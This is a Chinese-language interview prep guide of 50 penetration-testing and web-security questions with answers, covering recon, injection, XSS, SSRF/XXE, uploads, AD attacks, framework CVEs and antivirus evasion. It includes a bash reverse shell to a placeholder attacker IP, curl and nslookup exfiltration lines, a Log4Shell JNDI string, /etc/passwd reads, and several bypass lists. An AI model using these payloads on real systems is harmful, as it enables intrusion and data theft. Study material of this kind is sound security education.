# 渗透测试 / Web安全 实习面试 50 题精选

> 题目来源：GitHub 面试题库 + 大厂真实面经
> 筛选原则：以 Web 安全与渗透基础为核心，减少护网/攻防演练专项内容，适合学生串联已有知识、形成体系
> 建议使用方式：每题先自己尝试回答，再看解析；对每个考点动手复现一次

---

## 一、渗透测试基础（8 题）

### 1. 完整的渗透测试流程是怎样的？

信息收集 -> 漏洞探测 -> 漏洞利用 -> 权限提升 -> 横向移动 -> 权限维持 -> 痕迹清理 -> 出具报告。每一步都说得出具体做哪些事情（用什么工具、收集什么信息、常见手法）。

### 2. 信息收集阶段你一般会做哪些事情？

- 子域名收集（爆破、证书透明度、搜索引擎）
- 端口扫描（Nmap 全端口 + 服务版本识别）
- 目录/文件扫描（dirsearch、gobuster）
- CMS/框架指纹识别（Wappalyzer、WhatWeb）
- 历史漏洞搜索（Exploit-DB、CNVD）
- GitHub 信息泄露（`filename:.env`、`org:`、`password` 等关键字搜索）
- 公司员工邮箱格式、VPN/邮件/OA 系统入口

### 3. CDN 是什么？如何判断目标是否使用 CDN？如何绕过？

**判断**：多地 Ping（站长工具），看是否返回不同 IP；Nslookup 检查。

**绕过思路**：
- 子域名（很多公司只给主站上 CDN）
- DNS 历史记录（SecurityTrails、VirusTotal）
- 邮件头分析（发一封邮件获取邮件服务器源 IP）
- SSL 证书搜索（Censys、Shodan）
- 网站 RSP 指纹匹配（Shodan/ZoomEye/Fofa 搜索特征、icon hash）
- 利用网站功能（比如 RSS 订阅、WebSocket 等可能直连源站）

### 4. Shodan、ZoomEye、Fofa 这些搜索引擎的原理是什么？各自特点？

它们本质是全互联网的端口扫描器，定期对全球 IP 做端口扫描并抓取 banner 信息。Shodan 偏向国外，Fofa 偏向国内。配合语法可以做资产发现、漏洞普查。面试时能举具体语法更好。

### 5. 你拿到一个 WebShell 后一般做哪些操作？

- `whoami` / `id` 确认当前身份
- 系统信息收集（`uname -a` / `systeminfo`）
- 网络信息收集（`ipconfig`/`ifconfig`、`netstat -ano`、`arp -a`）
- 进程列表（`ps aux` / `tasklist`）
- 尝试提权
- 查看敏感文件（配置文件、数据库连接信息、源码）
- 凭证搜集（浏览器保存密码、历史命令、各类配置文件）

### 6. 反弹 Shell 的原理是什么？常用的反弹 Shell 命令有哪些？

**原理**：靶机主动连接攻击机的监听端口，将 shell 的 stdin/stdout/stderr 重定向到 TCP 连接上，从而绕过防火墙对入站流量的限制。

常用命令（bash）：
```bash
bash -i >& /dev/tcp/攻击机IP/端口 0>&1
```
Python、PHP、Netcat 等版本也要会说一两个。

### 7. 正向 Shell 和反向 Shell 的区别？分别适用什么场景？

- **正向 Shell**：靶机开端口监听，攻击者主动连接。适用出站受限但入站开放的场景。
- **反向 Shell**：攻击机监听，靶机主动连接回来。适用入站受限（有防火墙限制入站连接）但出站开放的场景，这是更常见的情况。

### 8. 渗透测试中遇到 403 Forbidden 怎么绕过？

- 修改请求方法（GET -> POST）
- 添加/修改 HTTP 请求头（X-Forwarded-For、X-Real-IP、X-Custom-IP-Authorization）
- URL 路径绕过（`/admin` -> `/admin/`、`/admin;/`、`//admin//`、URL 编码）
- 更换 User-Agent
- 换个请求来源（Referer 头伪造）
- 尝试 HTTP/2 -> HTTP/1.1 降级

---

## 二、SQL 注入（6 题）

### 9. SQL 注入的原理是什么？有哪些分类？

用户输入被拼接进 SQL 语句中执行。含数字型、字符型、搜索型。按注入位置分为 GET 型、POST 型、Cookie 型、Header 型。按回显分为联合查询、报错注入、布尔盲注、时间盲注、DNS 外带。

### 10. Union 注入、报错注入、布尔盲注、时间盲注的应用场景和区别？

| 方式 | 条件 | 常用场景 |
|------|------|----------|
| Union 注入 | 有回显 | 最快，直接获取数据 |
| 报错注入 | 报错信息可见 | 有回显但无法 Union |
| 布尔盲注 | 有"正常"和"异常"两种页面状态 | 无报错无回显但页面有差异 |
| 时间盲注 | 完全无回显、无差异 | 最后手段，速度最慢 |
| DNS 外带 | SQL Server（xp_dirtree）、MySQL（load_file） | 盲注加速，可用的最快方式 |

### 11. SQL 注入如何绕过 WAF？

- 大小写混合：`SeLeCt`
- 双写绕过：`selselectect`
- 内联注释：`/*!50000select*/`
- 等价替换：`substr` -> `mid`、`limit` -> `offset`，空格 -> `/**/`、`%0a`、`%0d`
- 参数污染：`?id=1&id=2 union select...`
- 分块传输（Chunked Transfer）
- 编码绕过：URL 编码、十六进制编码、Unicode 编码
- Buffer 溢出绕过（超长参数使 WAF 截断）

### 12. SQL 注入写 WebShell 需要什么条件？

**MySQL**：
- `secure_file_priv` 为空或允许写入目标目录
- 知道网站绝对路径
- 有 FILE 权限

**SQL Server**：`xp_cmdshell` 开启，可直接写文件或执行命令。

知道不同数据库写入方式的差异（`into outfile` vs `into dumpfile`）。

### 13. SQL 注入时，逗号被过滤了怎么办？

- `limit 1 offset 0` 代替 `limit 0,1`
- `substr(str from 1 for 1)` 代替 `substr(str,1,1)`
- `union select * from (select 1)a join (select 2)b` 代替 `union select 1,2`
- `mid(database(),1,1)` 也可以用 `mid(database() from 1 for 1)`

### 14. 预编译（Prepared Statement）为什么能防 SQL 注入？什么情况下预编译也防不住？

预编译将 SQL 语句结构和数据分开处理，先发送 SQL 模板，再发送参数，参数不会被当作 SQL 代码执行。

**仍可能防不住的场景**：
- `order by`、动态表名/列名无法预编译——只能拼接，需要严格白名单校验
- 存储过程中拼接了外部输入
- `like` 模糊查询拼接了通配符

---

## 三、XSS 与前端安全（5 题）

### 15. XSS 有哪几种类型？分别有什么区别？

- **反射型 XSS**：恶意脚本在 URL 参数中，服务器将其"反射"回页面。需要诱导受害者点击链接。
- **存储型 XSS**：恶意脚本存储在服务器（数据库、留言板等），受害者访问页面时触发。危害最大。
- **DOM 型 XSS**：纯客户端问题。恶意数据被 JavaScript 写入 DOM，全程不经过服务器。`document.write()`、`innerHTML`、`eval()` 等是常见 sink。

### 16. XSS 能做什么？你能给出具体攻击场景吗？

- 窃取 Cookie（`document.cookie` 发送到攻击者服务器）
- 劫持用户操作（表单劫持、页面篡改）
- 键盘记录（监听 `keypress` 事件）
- 内网端口扫描（利用 WebSocket 或 img 标签）
- 浏览器漏洞利用（BeEF 框架）
- 配合 CSRF 做蠕虫传播

### 17. HttpOnly 的作用是什么？如何绕过？

HttpOnly 标记的 Cookie 无法被 `document.cookie` 读取，用于防止 XSS 窃取 Cookie。

**绕过/替代思路**：
- XSS 不一定只偷 Cookie，可以直接发请求（利用受害者的浏览器本身就是登录态）
- 通过 `TRACE` 方法反射请求头中的 Cookie
- PHP 的 `session_id` 可能被暴力猜测
- 某些框架将 Cookie 也存一份在 `localStorage`

### 18. CSP（Content Security Policy）是什么？怎么绕过？

CSP 是浏览器安全策略，通过 HTTP 头或 `<meta>` 标签限制页面可以加载的资源来源。

**常见绕过方式**：
- JSONP 接口在允许的域名下 -> 可利用
- CSP 中允许 `'unsafe-inline'` -> script 块可执行
- `script-src` 包含 CDN（如 cdnjs、ajax.googleapis.com） -> 可引入已知版本的 Angular/jQuery 中带模板注入的库
- `base-uri` 未设置 -> 通过 `<base>` 标签劫持相对路径加载

### 19. CSRF 的原理和防御方式？

**原理**：利用用户已有的登录态，诱导用户点击恶意链接/访问恶意页面，以用户身份发送伪造请求。

**防御**：
- CSRF Token（服务端生成随机 token，请求时必须携带）
- 同源检测（Referer/Origin 头校验）
- SameSite Cookie（`Strict` / `Lax` 模式）
- 二次验证（敏感操作需要输入密码/验证码）

---

## 四、SSRF 与 XXE（4 题）

### 20. SSRF 是什么？能用来做什么？

服务端请求伪造。攻击者让服务器发起一个攻击者控制的请求，从而利用服务器的网络位置访问内网资源。

**利用方向**：
- 探测内网端口和服务（`http://127.0.0.1:3306`）
- 读取内网文件（`file:///etc/passwd`）
- 访问云元数据服务（AWS `169.254.169.254`、阿里云 `100.100.100.200`）
- 配合 Redis 未授权访问写 WebShell 或计划任务
- 攻击内网 Web 应用

### 21. SSRF 的常见绕过手法？

- IP 进制转换：`127.0.0.1` -> `2130706433`（十进制） -> `0x7f.0.0.1`（十六进制）
- DNS 解析绕过：域名绑定到 `127.0.0.1`（如 `xip.io`、`nip.io`）
- 302 跳转绕过（攻击者服务器返回 302 到内网地址）
- URL 解析差异（`http://evil@127.0.0.1`）
- IPv6：`[::1]`、`[0:0:0:0:0:ffff:127.0.0.1]`
- 短链接绕过域名白名单

### 22. XXE 漏洞的原理和利用？

XML 外部实体注入。当 XML 解析器启用了外部实体时，攻击者可以通过构造恶意的 DOCTYPE 声明来读取本地文件、发起 SSRF 请求。

**利用方式**：
- 文件读取：`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- 内网探测：`<!ENTITY xxe SYSTEM "http://内网IP:端口">`
- 拒绝服务（Billion Laughs 攻击）
- PHP expect 协议可执行命令

### 23. Blind XXE 怎么利用？

服务器不返回实体内容，但 XML 解析仍然发生。通过外带数据：
- 将文件内容拼到 URL 中发起请求（攻击者监听 DNS/HTTP）
- 参数实体 + DTD 文件组合外带

---

## 五、文件上传与文件包含（3 题）

### 24. 文件上传漏洞有哪些绕过方法？

- 前端 JS 校验 -> 抓包绕过
- MIME 类型绕过：`Content-Type: image/jpeg`
- 扩展名绕过：`php3, php4, phtml, pht, phar, shtml`（黑名单不全）
- 大小写：`.Php`、双写：`.pphphp`
- 点/空格截断：`shell.php.`、`shell.php `（Windows）
- `%00` 截断（PHP < 5.3.4）
- 图片马 + 文件包含配合
- `.htaccess` / `.user.ini` + 图片马
- 条件竞争（先传上去，在删除之前访问）

### 25. 文件包含漏洞（LFI/RFI）的原理和利用？

**LFI（本地文件包含）**：参数被传入 `include/require`，可读取本地文件。

- 读源码：`php://filter/convert.base64-encode/resource=index.php`
- 读日志：包含 Apache/Nginx 访问日志，日志中有 User-Agent 里的 PHP 代码
- 包含 session 文件：session 中有用户可控数据
- 包含 `/proc/self/environ`：User-Agent 写入环境变量

**RFI（远程文件包含）**：直接包含远程服务器上的恶意 PHP 文件，需要 `allow_url_include=On`。

### 26. `%00` 截断的原理是什么？

PHP < 5.3.4 中 `%00` 被当作 C 语言字符串的终止符。`include("file.php%00.jpg")` -> PHP 实际打开的是 `file.php`。5.3.4 之后已修复，但仍可能出现在旧系统中。

---

## 六、命令执行与代码执行（4 题）

### 27. 命令执行漏洞的常见函数有哪些？如何绕过过滤？

**PHP 常见函数**：`system()`、`exec()`、`passthru()`、`shell_exec()`、反引号 `` ` ``、`popen()`、`proc_open()`。

**绕过技巧**：
- 空格绕过：`$IFS`、`${IFS}`、`<`、`<>`、`{cat,/etc/passwd}`
- 关键字绕过：`c\at`、`c'a't`、`c"a"t`、`/bin/c?t`
- 无回显：反弹 shell 或 DNS 外带
- 长度限制：`wget` 下载大文件执行、分段拼接写入
- 路径限制：环境变量 `$PATH` 劫持

### 28. 什么是命令注入、代码注入、模板注入（SSTI）？区别在哪里？

- **命令注入**：注入点在系统命令层面，如 `ping 127.0.0.1;id`
- **代码注入**：注入点直接执行代码（PHP `eval()` 中插入恶意代码）
- **SSTI（服务端模板注入）**：注入点在被模板引擎渲染时执行。如 Jinja2 `{{config}}`、`{{''.__class__.__mro__[1].__subclasses__()}}`，可以一步步拿到 RCE

三者递进关系：SSTI 往往更难利用，但危害同等。

### 29. 无回显的命令执行怎么判断和利用？

**判断**（盲命令执行）：
- 时间延迟：`ping -c 3 127.0.0.1`
- DNS 外带：`` `nslookup $(whoami).攻击机域名` ``
- HTTP 外带：`curl http://攻击机/$(whoami)`
- 写入文件再访问

### 30. 反序列化漏洞的原理是什么？POP 链是什么意思？

**原理**：当反序列化不可信数据时，对象的 `__wakeup()`、`__destruct()`、`__toString()` 等魔术方法被自动调用，可能被利用。

**POP 链（Property Oriented Programming）**：不需要控制整个类，而是把已有的类当作"零件"，通过控制对象属性值，让它们在反序列化和销毁过程中串成一条"调用链"，最终执行恶意操作。

---

## 七、认证与会话安全（5 题）

### 31. Session 和 Cookie 的关系？Session 劫持怎么防？

**关系**：
- Cookie 存在客户端，Session 存在服务端。
- 浏览器携带 Cookie（内含 Session ID），服务端根据 Session ID 找到对应的 Session 数据。

**Session 劫持防御**：
- HttpOnly（防 XSS 读取 Cookie）
- Secure（仅 HTTPS 传输）
- SameSite（防 CSRF）
- Session ID 定期更换（登录后重新生成）
- IP / User-Agent 绑定（有争议，可能影响正常用户）

### 32. JWT（JSON Web Token）是什么？有哪些攻击面？

JWT 是自包含的认证令牌，由 Header、Payload、Signature 三部分组成，Base64 编码后用 `.` 连接。

**攻击面**：
- `alg: none`：将算法设为 none，签名部分留空 -> 绕过验证
- 密钥混淆（RS256 -> HS256）：用公钥当 HMAC 密钥来签名
- `kid`（Key ID）注入：`kid` 参数拼接到路径 -> 目录遍历/任意文件读取 -> SQL 注入
- `jku`/`jwk`：指向攻击者的 JWK Set 或直接嵌入恶意公钥
- 暴力破解弱密钥（HS256 使用短密码时）
- 未校验 `exp`/`nbf` 时间戳
- JWT 泄露（放 localStorage 中可能被 XSS 读取）

### 33. OAuth 2.0 的授权流程是怎样的？常见漏洞有哪些？

**授权码模式流程**：
1. 客户端重定向用户到授权服务器
2. 用户同意授权 -> 返回授权码（code）
3. 客户端用 code 换 access_token
4. 用 access_token 请求资源

**常见漏洞**：
- `redirect_uri` 未校验 -> 任意重定向，劫持 code
- `state` 参数缺失 -> CSRF 导致账号绑定到攻击者身份
- code 未绑定 client_id -> 跨客户端使用
- `response_type=token` 隐式模式 -> token 暴露在 URL 片段中

### 34. 单点登录（SSO）的原理和安全风险？

多个系统共用认证中心。用户在一个系统登录后，其他系统通过票据（ticket/token）不再需要登录。

**安全风险**：
- 票据伪造（加密算法弱或密钥泄露）
- 票据劫持（中间人攻击）
- 退出不同步（一处退出，其他系统未退出）
- 认证中心本身成为单点故障和攻击目标

### 35. 暴力破解怎么防？验证码有哪些绕过方式？

**防御**：
- 账号锁定策略（N 次失败后锁定 M 分钟）
- 验证码（多次失败后出现）
- IP 限制（单 IP 请求频率限制）
- 密码复杂度要求

**验证码绕过**：
- 验证码不刷新（同一个验证码可多次使用）
- 验证码在返回包或 Cookie 中明文显示
- 直接删除验证码参数不传（后端没做强校验）
- OCR 识别 / 打码平台
- 逻辑绕过（验证码校验和业务流程分离，先跳过校验直接提交）

---

## 八、内网渗透（6 题）

### 36. Kerberos 认证流程是怎样的？（简要描述）

1. **AS-REQ/AS-REP**：用户向 KDC 的 AS 发起认证请求，AS 返回加密的 TGT（票据授予票据，用 krbtgt 的 NTLM Hash 加密）
2. **TGS-REQ/TGS-REP**：用户用 TGT 向 TGS 请求访问某服务的 ST（服务票据）
3. **AP-REQ/AP-REP**：用户使用 ST 向目标服务发起访问

理解这个流程才能理解黄金/白银票据。

### 37. 黄金票据和白银票据的区别？

| | 黄金票据 | 白银票据 |
|------|----------|----------|
| 伪造对象 | TGT（票据授予票据） | ST（服务票据） |
| 需要的 Hash | krbtgt 的 NTLM Hash | 目标服务账户的 NTLM Hash |
| 作用范围 | 可访问域内任意服务 | 只能访问特定服务 |
| 需要域管权限 | 是（需要拿 krbtgt hash） | 不一定（拿到服务账户 hash 即可） |

### 38. Kerberoasting 攻击的原理？

任何域用户都可以向域内的 SPN（服务主体名称）申请 TGS 票据。TGS 票据的一部分是用服务账户的 NTLM Hash 加密的。将这个加密票据离线暴力破解 -> 获得服务账户的明文密码。不需要高权限，是域内横向移动的常用手法。

### 39. NTLM Relay 攻击的原理？

1. 攻击者在中间，将受害者发来的 NTLM 认证请求转发（Relay）到目标服务器
2. 目标服务器认为攻击者是受害者，认证通过
3. 攻击者以受害者身份在目标服务器上执行操作

关键条件：目标服务器未开启 SMB 签名。

### 40. PTH（Pass The Hash）的原理？和 PTK（Pass The Key）有什么区别？

**PTH**：Windows 认证用的是 NTLM Hash 而非明文密码。攻击者拿到 NTLM Hash 后可以直接用这个 Hash 进行认证，不需要知道明文密码。mimikatz 中的 `sekurlsa::pth`。

**PTK**：对于加入了 Credential Guard 或某些特殊配置的机器，普通的 NTLM Hash 可能失效。此时如果能拿到 AES Key（AES-128/256），可以直接用 AES Key 进行 Kerberos 认证。

### 41. Windows 常见的提权手法有哪些？

- 内核漏洞提权（msf 的 local_exploit_suggester）
- 服务提权：可写服务路径、服务未引号路径
- DLL 劫持：程序加载 DLL 时优先搜索恶意 DLL
- AlwaysInstallElevated 注册表键为 1 -> 通过 MSI 安装包提权到 SYSTEM
- 令牌窃取（Token Impersonation）
- 计划任务（SCHTASKS）
- 土豆系列（Juicy Potato / Sweet Potato / PrintSpoofer）：利用 COM 对象

---

## 九、中间件与框架漏洞（5 题）

### 42. Shiro 反序列化漏洞（550/721）的原理？

**Shiro 550**：Shiro < 1.2.4，AES 加密 rememberMe cookie 的密钥硬编码为 `kPH+bIxk5D2deZiIxcaaaA==`。攻击者用它加密恶意序列化 Payload，写入 rememberMe Cookie -> 服务端解密触发反序列化 -> RCE。

**Shiro 721**：Shiro >= 1.2.4 使用随机密钥。但 rememberMe 使用 AES-CBC 模式，如果攻击者能获取一个合法 rememberMe Cookie，可以通过 Padding Oracle Attack 逐字节解密/加密，最终构造恶意 Cookie -> RCE。需要大量请求（> 10000+）。

### 43. Log4j2（Log4Shell）漏洞的原理？

Log4j2 的 lookup 功能在日志消息中进行递归解析。在 `${...}` 中嵌入 JNDI 查找请求。如 `${jndi:ldap://攻击者/恶意类}`。Log4j2 发起 LDAP 请求 -> 从攻击者 LDAP 服务下载远程类 -> 加载执行 -> RCE。

**高版本绕过**（2.15 -> 2.17）：限制远程类加载、限制协议 -> 还可以用本地 `java` 协议枚举环境变量外带。

### 44. Fastjson 反序列化怎么利用？

Fastjson 在解析 JSON 时会根据 `@type` 字段指定的类名进行反序列化（AutoType 功能）。如果 `@type` 指向一个包含 `get/set` 方法的敏感类，并且存在利用链 -> RCE。

各版本 bypass 思路（随着版本升级不断封堵和绕过）：
- TemplatesImpl 加载字节码
- JNDI 注入（需要出网）
- JdbcRowSetImpl JNDI 注入
- 不需要出网的本地利用链

### 45. Struts2 漏洞的核心原因是什么？

Struts2 的 OGNL（Object-Graph Navigation Language）表达式注入。OGNL 是一种强大的表达式语言，可以访问对象属性和调用方法。当用户输入被当作 OGNL 表达式执行时，可以通过反射调用 `Runtime.getRuntime().exec()` 实现 RCE。

经典 CVE 如 S2-045（Content-Type 上传）、S2-057（namespace 注入）等，值得自己搭环境复现。

### 46. Weblogic / Tomcat 常见的漏洞有哪些？

**Weblogic**：
- T3 协议反序列化（CVE 系列众多）
- XMLDecoder 反序列化
- 控制台弱口令 -> 部署 War 包

**Tomcat**：
- Manager 弱口令 -> 部署 War 包
- CVE-2017-12615（PUT 方法任意写文件，条件是 `readonly=false`）
- AJP 协议漏洞（Ghostcat）

---

## 十、工具与防御对抗（4 题）

### 47. Burp Suite 你常用哪些功能？SQLMap 的原理和常用参数？

**Burp Suite**：
- Proxy（抓包改包）
- Repeater（重放请求）
- Intruder（暴力破解/参数 Fuzz）
- Scanner（主动/被动扫描）
- Extender（插件，如 Turbo Intruder、Autorize）

**SQLMap**：
- 原理：先判断是否有注入 -> 识别数据库类型 -> 获取数据。不仅支持 GET/POST，还支持 Cookie 注入、User-Agent 注入。
- 常用参数：`-u` / `-r` / `--dbs` / `-D 库名 --tables` / `--os-shell` / `--tamper`（绕过 WAF）

### 48. WAF 的检测和绕过思路总结？

**检测**：
- 直接触发 403/406 等拦截页面特征的返回包
- WAF 指纹识别：wafw00f 工具

**绕过思路**：
- 架构层：寻找真实 IP 绕过 CDN/WAF
- 协议层：分块传输、流水线请求（Pipeline）、HTTP 走私
- 语法层：大小写、双写、注释、等价替换、编码
- 逻辑层：参数污染、畸形包、数组绕过
- 资源层：WAF 因性能原因放过超大请求体

### 49. 常见的免杀思路有哪些？

- **静态免杀**：代码混淆、字符串加密、Shellcode 加密/编码、分离加载（远程下载 Shellcode）
- **动态免杀**：反沙箱（检测虚拟机、检测运行时间）、反调试、延迟执行、API 直接/间接调用（syscall 绕过用户态 hook）
- **行为免杀**：进程注入方式变化（不直接创建进程）、回调函数执行、白利用程序（带微软签名的程序加载恶意 DLL）
- **AMSI 绕过**：patch AmsiScanBuffer、使用 .NET 反射

### 50. NMAP 的扫描原理？SYN 扫描和 TCP 全连接扫描有什么区别？

**SYN 扫描（-sS，半开扫描）**：
- 发 SYN -> 收到 SYN/ACK 端口开 -> 发 RST（不完成握手）
- 日志记录少，速度快，默认且最常用

**TCP 全连接扫描（-sT）**：
- 发 SYN -> 收到 SYN/ACK -> 发 ACK 完成三次握手 -> 发 RST 断开
- 应用层日志可能记录，但某些环境下比 SYN 更稳定

---

## 附：这 50 题的知识体系地图

```
渗透测试全流程
|
+-- 信息收集 (Q1-4)
|     +-- 域名/IP/端口
|     +-- CDN 识别与绕过
|     +-- 搜索引擎与资产测绘
|
+-- Web 漏洞利用
|     +-- SQL 注入 (Q9-14)
|     +-- XSS (Q15-19)
|     +-- SSRF/XXE (Q20-23)
|     +-- 文件上传/包含 (Q24-26)
|     +-- 命令/代码执行 (Q27-30)
|     +-- 认证/会话 (Q31-35)
|
+-- 权限提升 (Q41)
|
+-- 内网渗透 (Q36-40)
|     +-- Kerberos 认证
|     +-- 票据攻击 / Relay
|     +-- 横向移动
|
+-- 框架/中间件漏洞 (Q42-46)
|     +-- Java: Shiro, Log4j2, Fastjson, Struts2
|     +-- 中间件: Weblogic, Tomcat
|
+-- 防御对抗 (Q47-50)
      +-- WAF 绕过
      +-- 免杀基础
      +-- 工具使用
```

---

## 使用建议

1. **一次不要贪多**：每天 3-5 题，先自己打字回答，再对照解析补漏
2. **每题必须动手**：纸上谈兵不如搭环境跑一遍（Docker 拉镜像、Vulhub 复现）
3. **串联知识点**：比如 Kerberos 那几题，画张流程图就全通了
4. **讲给别人听**：能讲清楚 == 真理解。可以录屏或对着空气讲
5. **边学边做笔记**：每个考点写一段自己的总结，面试前翻一遍
